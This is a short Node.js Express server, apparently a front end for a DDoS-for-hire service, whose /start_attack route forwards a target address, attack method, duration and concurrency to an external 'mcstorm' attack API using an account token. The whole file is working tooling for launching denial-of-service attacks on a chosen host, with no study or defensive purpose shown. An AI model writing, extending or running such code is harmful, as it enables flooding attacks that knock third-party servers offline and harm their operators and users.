const express = require('express');
const bodyParser = require('body-parser');
const axios = require('axios');

const app = express();
const PORT = 3000;

app.use(bodyParser.urlencoded({ extended: true }));

const mcStormToken = 'your mcstorm key';

app.get('/start_attack', (req, res) => {
  const { ipport, protocol, method, time, network, concurrent } = req.query;

  const mcStormURL = 'https://api.mcstorm.is/start_attack';
  const postData = `token=${mcStormToken}&ipport=${ipport}&protocol=${protocol}&method=${method}&time=${time}&network=${network}&concurrent=${concurrent}`;

  axios.post(mcStormURL, postData, {
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
    },
  })
  .then((response) => {
    res.json(response.data);
  })
  .catch((error) => {
    console.error(error);
    res.status(500).json({ status: 'error', error: 'internal_server_error' });
  });
});

app.listen(PORT, () => {
  console.log(`Running: 0.0.0.0:${PORT} - made by lopusnik`);
});
